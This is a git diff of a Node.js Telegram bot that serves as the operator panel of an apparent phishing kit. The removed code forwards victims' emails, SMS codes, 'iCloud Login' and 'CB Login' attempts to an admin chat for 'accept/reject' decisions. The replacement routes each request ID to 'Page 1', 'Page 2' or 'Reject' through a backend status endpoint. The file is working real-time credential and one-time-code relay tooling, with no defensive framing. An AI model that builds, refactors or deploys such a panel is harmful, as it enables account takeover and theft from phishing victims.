@@ -1,4 +1,4 @@
-// bot.js (merged version)
+// bot.js (minimal)
 const TelegramBot = require("node-telegram-bot-api");
 const fetch = require("node-fetch");
 
@@ -11,177 +11,61 @@ if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
   process.exit(1);
 }
 
-// Initialize bot
 const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
-// -----------------
-// Email/Password approval (big code)
-// -----------------
-function sendApprovalRequest(email, password) {
+async function sendApprovalButtons(requestId, label = "New request") {
   const options = {
     reply_markup: {
       inline_keyboard: [
         [
-          { text: "✅ Accept", callback_data: `accept|${email}` },
-          { text: "❌ Reject", callback_data: `reject|${email}` }
+          { text: "➡️ Page 1", callback_data: `page1|${requestId}` },
+          { text: "➡️ Page 2", callback_data: `page2|${requestId}` },
+          { text: "❌ Reject", callback_data: `reject|${requestId}` }
         ]
       ]
     }
   };
-  bot.sendMessage(
+
+  await bot.sendMessage(
     ADMIN_CHAT_ID,
-    `*Login Approval Requested*\n*Email:* ${email}`,
+    `🔔 *${label}*\nRequestId: \`${requestId}\``,
     { ...options, parse_mode: "Markdown" }
   );
 }
 
-// -----------------
-// Generic code approval (big code)
-// -----------------
-function sendApprovalRequestGeneric(identifier) {
-  const options = {
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "✅ Accept", callback_data: `accept|${identifier}` },
-          { text: "❌ Reject", callback_data: `reject|${identifier}` }
-        ]
-      ]
-    }
-  };
-  bot.sendMessage(
-    ADMIN_CHAT_ID,
-    `*Approval Requested*\nIdentifier: ${identifier}`,
-    { ...options, parse_mode: "Markdown" }
-  );
-}
-
-// -----------------
-// SMS code approval (big code)
-// -----------------
-function sendApprovalRequestSMS(code) {
-  const options = {
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "✅ Accept", callback_data: `accept|${code}` },
-          { text: "❌ Reject", callback_data: `reject|${code}` }
-        ]
-      ]
-    }
-  };
-  bot.sendMessage(
-    ADMIN_CHAT_ID,
-    `*SMS Approval Requested*\n*Code:* ${code}`,
-    { ...options, parse_mode: "Markdown" }
-  );
-}
-
-// -----------------
-// iCloud Login approval (big code)
-// -----------------
-function sendApprovalRequestPage(email, password) {
-  const options = {
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "✅ Accept", callback_data: `accept|${email}` },
-          { text: "❌ Reject", callback_data: `reject|${email}` }
-        ]
-      ]
-    }
-  };
-  bot.sendMessage(
-    ADMIN_CHAT_ID,
-    `*iCloud Login Approval Requested*\n*Email:* ${email}`,
-    { ...options, parse_mode: "Markdown" }
-  );
-}
-
-// -----------------
-// CB Login approval (from small code)
-// -----------------
-async function sendLoginTelegram(email) {
-  const options = {
-    parse_mode: "Markdown",
-    reply_markup: {
-      inline_keyboard: [
-        [
-          { text: "➡️ Page 1", callback_data: `page1|${email}` },
-          { text: "➡️ Page 2", callback_data: `page2|${email}` },
-          { text: "❌ Reject", callback_data: `reject|${email}` }
-        ]
-      ]
-    }
-  };
-
-  const message = `📧 *Email:* ${email}`;
-  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
-}
-
-
-// -----------------
-// Handle button clicks (merged)
-// -----------------
 bot.on("callback_query", async (query) => {
   try {
-    const [action, identifier] = query.data.split("|");
-    const status = action === "accept" ? "accepted" : "rejected";
+    const [action, requestId] = (query.data || "").split("|");
 
-    // Notify backend
+    let status;
+    if (action === "page1") status = "page1";
+    else if (action === "page2") status = "page2";
+    else if (action === "reject") status = "rejected";
+    else return;
+
     await fetch(`${APP_URL}/update-status`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      // Support both email + identifier formats
-      body: JSON.stringify({ email: identifier, identifier, status })
+      body: JSON.stringify({ requestId, status })
     });
 
-    // Try HTML first (small code style), fallback to Markdown (big code style)
-    try {
-      await bot.editMessageText(
-        `🔐 <b>${identifier}</b> has been <b>${status.toUpperCase()}</b>`,
-        {
-          chat_id: query.message.chat.id,
-          message_id: query.message.message_id,
-          parse_mode: "HTML"
-        }
-      );
-    } catch {
-      await bot.editMessageText(
-        `🔐 ${identifier} has been *${status.toUpperCase()}*`,
-        {
-          chat_id: query.message.chat.id,
-          message_id: query.message.message_id,
-          parse_mode: "Markdown"
-        }
-      );
-    }
+    await bot.editMessageText(`✅ Request \`${requestId}\` → *${status.toUpperCase()}*`, {
+      chat_id: query.message.chat.id,
+      message_id: query.message.message_id,
+      parse_mode: "Markdown"
+    });
 
-    await bot.answerCallbackQuery(query.id, { text: `❗️${status.toUpperCase()}❗️` });
-
+    await bot.answerCallbackQuery(query.id, { text: status.toUpperCase() });
   } catch (err) {
-    console.error("❌ Failed to handle callback:", err);
-    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error handling approval`);
+    console.error("❌ Callback error:", err);
+    try {
+      await bot.answerCallbackQuery(query.id, { text: "ERROR" });
+    } catch {}
   }
 });
 
-// /start command for big bot
 bot.onText(/\/start/, (msg) => {
-  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for approvals.");
+  bot.sendMessage(msg.chat.id, "✅ Bot is running.");
 });
 
-// /startcb command for CB login bot
-bot.onText(/\/startcb/, (msg) => {
-  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for CB login approvals.");
-});
-
-module.exports = {
-  bot,
-  sendApprovalRequest,
-  sendApprovalRequestGeneric,
-  sendApprovalRequestSMS,
-  sendApprovalRequestPage,
-  sendLoginTelegram
-};
-
-
+module.exports = { bot, sendApprovalButtons };
